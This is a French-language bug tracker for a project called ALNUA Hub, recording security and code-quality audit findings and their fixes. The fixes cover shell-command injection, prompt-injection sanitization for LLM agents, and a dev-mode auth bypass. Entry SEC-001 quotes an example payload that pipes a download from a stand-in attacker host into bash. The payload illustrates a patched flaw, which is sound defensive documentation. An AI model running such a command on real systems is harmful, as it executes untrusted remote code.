# Bugs — ALNUA Hub

> Créé le 2026-07-25 lors du bootstrap de gouvernance, alimenté par un audit sécurité
> + un audit qualité de code menés en parallèle (voir `DOC_AUDIT.md` pour le détail de
> la méthode). Convention : `SEC-XXX` pour la sécurité, `BUG-XXX` pour le reste.

## Corrigés (2026-07-25)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| SEC-001 | **Critique** | `POST /ide/run` (`services/ide_workspace.py::run_sandbox_command`) — `subprocess.run(cmd, shell=True)` avec allowlist par préfixe (`startswith`) : les métacaractères shell (`;`, `&&`, `\|`, backticks) passaient après un préfixe autorisé (ex. `echo x && curl evil/x\|bash`), et un `pytest-evil` passait le filtre par préfixe | Rejet des commandes contenant `; & \| \` $ < > \n \r`, et comparaison du premier token **exact** (plus de `startswith`) contre l'allowlist. Vérifié : commandes légitimes passent, injection et bypass de préfixe bloqués (test manuel), `ruff` clean |
| SEC-004 | Moyenne | `POST /sav/ask` (`bots/sav_bot.py::handle_question`) — texte libre client inséré dans le prompt LLM sans passer par `sanitize_user_input`, contrairement au pattern systématique de `agents_pole.py` | `question = sanitize_user_input(question, max_length=2000)` avant construction du prompt |
| SEC-005 | Moyenne | `POST /agents/brainstorm` et `/agents/brainstorm/chat` (`api/routers/releases.py`) — `topic`, `context_notes`, `message` transmis à `BrainstormAgent` sans sanitization | Ajout d'un helper `_clean()` (même pattern que `agents_pole.py::_clean`) appliqué aux 3 champs |
| SEC-006 | Moyenne | `services/trend_monitor.py::_llm_synthesize_trends` — titres bruts HackerNews/Reddit/GitHub (contenu externe non fiable, contrôlé par n'importe qui sur ces plateformes) interpolés tels quels dans le prompt de synthèse LLM | `sanitize_user_input(item.title, max_length=300)` (strip_injection actif par défaut) avant assemblage du prompt |
| BUG-001 | Faible | `agents/rnd_agent.py::__init__` et `agents/rnd_social_agent.py::__init__` redéfinissaient `__init__` sans appeler `super().__init__()` — violation de la règle invariante `AgentBase` (voir `CLAUDE.md`). Sans impact fonctionnel aujourd'hui (les deux assignaient manuellement les mêmes attributs que `AgentBase`), mais silencieusement fragile si `AgentBase.__init__` gagne un attribut | `super().__init__(db, llm)` / `super().__init__()` en première ligne, imports `get_supabase`/`LLMClient` devenus inutiles retirés. Suite complète (354 passed, 6 skipped) + `ruff` verts après coup |

## Corrigés (2026-07-25, suite — décision Emilie)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| SEC-002 | **Haute** | Mode "dev ouvert" par défaut : `HUB_API_KEY` avait pour défaut `""`, et l'API démarrait quand même en dev — accès libre silencieux si un déploiement oubliait `ENVIRONMENT`/`HUB_API_KEY` | `config/settings.py::_validate_security` lève désormais une erreur au démarrage si `HUB_API_KEY` est vide, **quel que soit** `ENVIRONMENT` — plus de bypass dev. `api/middleware.py` simplifié en conséquence (suppression de `_hub_key_enforcement_enabled()` et du warning devenus morts). Voir `DECISIONS.md` DEC-010 pour le détail et les effets de bord traités (`.env.example`, `README.md`, `tests/test_devex_phase6.py` réécrit) |
| SEC-003 | Basse *(downgradée)* | `POST /agents/embedded/pi-command` — denylist best-effort sur les commandes SSH Pi, dépendait entièrement de SEC-002 pour être exploitable sans authentification | **Mitigée par SEC-002** : sans `HUB_API_KEY` valide, cet endpoint n'est plus atteignable du tout. Le filtrage par denylist lui-même (`skills/skill_pi_ssh.py`) n'a pas changé — reste un risque résiduel documenté dans le code (*"trust boundary, not a sandbox"*), accepté tant qu'un attaquant a besoin de la clé pour l'atteindre |
| DEC-009 | — | `skills/skill_nwiro.py` (UE5) contredisait la règle "Pas d'UE5" de `CLAUDE.md` | Tranché par Emilie : Nwiro/UE5 est un choix assumé, coexiste avec Godot. `CLAUDE.md` corrigé, aucun changement de code. Voir `DECISIONS.md` DEC-009 |

Suite de tests complète (`pytest tests/ -q` — 355 passed, 6 skipped) et `ruff check
agents/ services/ api/ config/ database/ bots/ skills/` **verts après SEC-002 aussi**,
y compris `tests/test_devex_phase6.py` réécrit pour le nouveau comportement.

## Ouverts — nécessitent une décision produit, non corrigés

| ID | Gravité | Description | Constat |
|----|---------|-------------|---------|
| BUG-002 | Info | `data/agent_models.json` est tracké par git (commit `16c84c2`) alors qu'il figure dans `.gitignore` — Git n'applique jamais rétroactivement un ignore à un fichier déjà suivi. Contenu vérifié : routage modèle par agent, aucune donnée sensible | Cosmétique — `git rm --cached data/agent_models.json` supprimerait le suivi sans supprimer le fichier local, mais c'est une action destructive sur l'historique de tracking à valider avec Emilie plutôt qu'à faire en autonome |
| BUG-003 | Info | `requirements.lock.txt` : `fastapi-mcp==0.4.0` est pinné exactement dans `requirements.txt` (donc censé être "vérifié installé" selon la convention du fichier) mais absent du lock. À distinguer des 8 paquets **déjà documentés** comme non vérifiés dans le commentaire `requirements.txt:53-57` (`stripe`, `google-play-scraper`, `composio_crewai`, `rq`, `pytest-cov`, les 2 `opentelemetry-instrumentation-*`, `boto3`) — ceux-là sont un gap connu et assumé, pas une nouvelle trouvaille | À vérifier dans l'environnement de déploiement réel avant de figer une version, conformément à la note déjà présente dans `requirements.txt` — ne pas deviner |
| BUG-004 | Info | Fichiers Python dépassant largement les ~300 lignes recommandées : `agents/coo_agent.py` (1475), `api/routers/rnd.py` (1242), `agents/rnd_center.py` (1210), `services/rnd_repository.py` (1056), `skills/skill_coding_agent.py` (1034), `services/workflow_engine.py` (1028), et 9 autres fichiers >700 lignes | Dette structurelle pré-existante, pas un bug fonctionnel. Un découpage de `coo_agent.py`/`rnd.py` est le candidat le plus net si une dette technique est planifiée un jour — pas entrepris ici (refactor de cette taille sur du code qui tourne = décision à part, pas un fix de sécurité/gouvernance) |
| BUG-005 | Info | `agents/coo_agent.py` a `AGENT_NAME = "coo_agent"` en interne (pas `"coo"`), sans alias dans `AGENT_ID_ALIASES` contrairement aux autres agents en `_agent` — déjà documenté comme connu dans `CLAUDE.md` avant ce bootstrap | Reporté ici pour visibilité dans le tracker de bugs plutôt que seulement en note CLAUDE.md — pas corrigé (pas dans le périmètre de cet audit) |

## Vérifié sans anomalie (audit sécurité, pour mémoire)

Secrets en dur, `.env` commité, injection SQL, CORS wildcard+credentials, path
traversal, logs qui fuient des secrets, contrôle d'accès sur `/mcp` et endpoints de
mutation — voir le détail dans `DOC_AUDIT.md`, audit 001.
